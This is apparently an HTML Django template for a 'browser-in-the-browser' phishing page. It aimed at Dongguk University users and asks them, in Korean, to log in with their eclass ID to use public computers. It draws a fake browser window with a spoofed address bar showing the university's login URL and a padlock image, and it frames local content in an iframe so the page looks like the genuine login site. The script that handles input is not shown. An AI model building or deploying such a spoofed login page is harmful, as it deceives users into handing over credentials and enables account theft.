<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="./static/style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<style>
.popup_browser {
	position: relative;
	background-color: #514c49;
	width: 100%;
	padding :20px;
}

* {
	box-sizing: border-box;
}
body, dl, dt, dd, ul, ol, li, h1, h2, h3, h4, h5, h6, p, table, th, td, form, fieldset, legend, textarea, input, select, textarea, button, figure, figcaption{
	margin: 0;
	padding: 0;
}
</style>
</head>
<body>
	<div>
        <div class="browser">
            <div class="close">
                <div class="checkbox" style="display: flex; justify-content: center;">
                	{% load static %}
			<img src="{% static '/donggukLogo.png' %}">
		</div>
            </div>

        </div>
    </div>
    <br>
    <div style="display: flex; justify-content: center;">
			<p style="height:50px;">동국대학교 공용 컴퓨터를 이용하시려면 eclass 아이디로 로그인 해주세요. </p>
    </div>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar" class="outer yosemite">
		<span class="dots">
	     
		<div id="exit" class="dot red"></div>
	     <div id="minimize" class="dot amber"></div>
	     <div id="maximize" class="dot green"></div>
	    </span>
	     <span id="logo-description">동국대학교 WISE캠퍼스 컴퓨터 이용하기</span>
	</div>
	<div id="url-bar">
		{% load static %}
		<img src="{% static '/ssl.svg' %}" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://wise.dongguk.ac.kr </span>
		<span id="domain-path">/service/login</span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="dongguk/" frameBorder="0">
	<img src="/static/donggukLogo.png">
</iframe>
</div>
</body>
<script src="./static/script.js"></script>
</html>
